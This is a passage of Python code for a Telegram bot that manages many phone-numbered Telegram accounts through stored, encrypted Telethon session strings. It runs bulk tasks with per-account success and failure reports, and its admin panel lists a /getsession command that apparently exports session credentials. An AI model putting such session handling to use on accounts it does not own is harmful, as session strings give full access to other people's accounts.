            text += f"🔹 Task {row[0]} ({row[1].upper()})\nStatus: {row[2]} | Progress: {row[3]}\n"
            text += f"↳ Details: /taskreport_{row[0]} | Cancel: /canceltask {row[0]}\n\n"

    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    try:
        task_id = int(message.text.split("_")[1])
    except (IndexError, ValueError):
        await message.answer("❌ Invalid command format.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, type, status, progress, success_report, failure_report, payload FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await message.answer("❌ Task not found in database.")
        return

    creator_id, task_type, status, progress, success_rep, failure_rep, payload = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await message.answer("🚫 Access Denied.")
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    report_text = (
        f"📊 Report for Task {task_id}\n"
        f"⚙️ Type: {task_type.upper()}\n"
        f"🚦 Status: {status}\n"
        f"📈 Progress: {progress}\n"
        f"📦 Settings: {payload}\n\n"
        f"🟢 Successes: {len(passed_list)} accounts\n"
        f"🔴 Failures: {len(failed_list)} accounts\n\n"
        f"🛑 Cancel Option: /canceltask {task_id}"
    )

    buttons = []
    if failed_list or passed_list:
        buttons.append([InlineKeyboardButton(text="📥 Download Report File", callback_data=f"exp_report:{task_id}")])
    buttons.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="main_menu")])

    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("exp_report:"))
async def export_task_report_file(callback: CallbackQuery):
    task_id = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, success_report, failure_report FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await callback.answer("Task not found.")
        return
        
    creator_id, success_rep, failure_rep = row
    if role not in ["admin", "owner", "super_owner"] and creator_id != user_id:
        await callback.answer("Access denied.")
        return

    passed_list = json.loads(success_rep) if success_rep else []
    failed_list = json.loads(failure_rep) if failure_rep else []

    output_lines = [
        f"=== REPORT FOR TASK {task_id} ===",
        f"SUCCESSFUL ACCOUNTS ({len(passed_list)}):",
    ]
    for p in passed_list:
        output_lines.append(f" - +{p}: SUCCESS")
        
    output_lines.append("\nFAILED ACCOUNTS AND ERROR MESSAGES:")
    for phone, reason in failed_list:
        output_lines.append(f" - +{phone}: FAILED | Reason: {reason}")

    raw_bytes = "\n".join(output_lines).encode("utf-8")
    file_payload = BufferedInputFile(raw_bytes, filename=f"task_{task_id}_report.txt")
    
    await callback.message.reply_document(file_payload, caption=f"📂 Complete log details file for task {task_id}.")
    await callback.answer()

# --- REFERRAL MATRIX INTERFACE ---
@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery):
    user_id = callback.from_user.id
    bot_info = await callback.bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]

    text = (
        f"👥 Your Referrals\n\n"
        f"🔗 Your Invite link:\n{ref_link}\n\n"
        f"📈 Total Invited Users: {count} verified members."
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- SYSTEM MANAGEMENT PANELS ---
@router.callback_query(F.data == "admin_panel")
async def handle_admin_panel(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    await callback.message.edit_text(
        "🛠️ Admin Control Panel\n"
        "Use the chat box to type these commands:\n\n"
        "🔹 /addadmin <id> <limit>\n"
        "🔹 /removeadmin <id>\n"
        "🔹 /getsession <phone>\n"
        "🔹 /deleteaccount <phone>\n"
        "🔹 /deleteuser <user_id>\n"
        "🔹 /canceltask <task_id>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]])
    )

@router.callback_query(F.data == "backup_panel")
async def backup_panel(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    buttons = [
        [InlineKeyboardButton(text="📥 Download DB Backup", callback_data="export_db")],
        [InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]
    ]
    await callback.message.edit_text("💾 Core Database Backups Panel", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "export_db")
async def export_db(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return
    try:
        async with aiosqlite.connect(db_mgr.db_path, timeout=10.0) as db:
            await db.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            
        with open(db_mgr.db_path, "rb") as f:
            file_data = f.read()
        file = BufferedInputFile(file_data, filename="database_core_backup.db")
        await callback.message.reply_document(file, caption="📂 Current SQLite database backup.")
        await callback.answer("Export completed.")
    except Exception as e:
        await callback.answer(f"❌ Export failed: {str(e)}", show_alert=True)

@router.callback_query(F.data == "system_stats")
async def system_stats(callback: CallbackQuery):
    role = await db_mgr.get_user_role(callback.from_user.id)
    if role not in ["owner", "super_owner"]:
        await callback.answer("🚫 Access Denied.", show_alert=True)
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users") as c1:
            total_users = (await c1.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts") as c2:
            total_accounts = (await c2.fetchone())[0]
        async with db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'") as c3:
            active_accounts = (await c3.fetchone())[0]

    stats_text = (
        f"📊 System Performance & Stats\n\n"
        f"👥 Total Registered Users: {total_users}\n"
        f"📱 Total Connected Accounts: {total_accounts}\n"
        f"🟢 Active Accounts: {active_accounts}\n"
        f"🔴 Dead or Expired Accounts: {total_accounts - active_accounts}"
    )
    buttons = [[InlineKeyboardButton(text="🔙 Back Main Menu", callback_data="main_menu")]]
    await callback.message.edit_text(stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

# --- BOOTSTRAP CHECKS ---
async def verify_saved_sessions():
    logger.info("Verifying connections of registered accounts...")
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()

    for phone, enc_session in accounts:
        try:
            client = TelegramClient(StringSession(decrypt_data(enc_session)), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                logger.warning(f"Verification failed for +{phone}. Setting status to dead.")
                async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                    await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                    await db_conn.commit()
            await client.disconnect()
        except Exception as e:
            logger.error(f"Error checking +{phone}: {e}")

async def main():
    await db_mgr.init()
    await verify_saved_sessions()

    bot = Bot(token=BOT_TOKEN)
    task_queue.set_bot(bot)

    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    worker_task = asyncio.create_task(task_queue.start_worker())
    logger.info("Bot is running and listening for events...")
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("System closed down cleanly.")
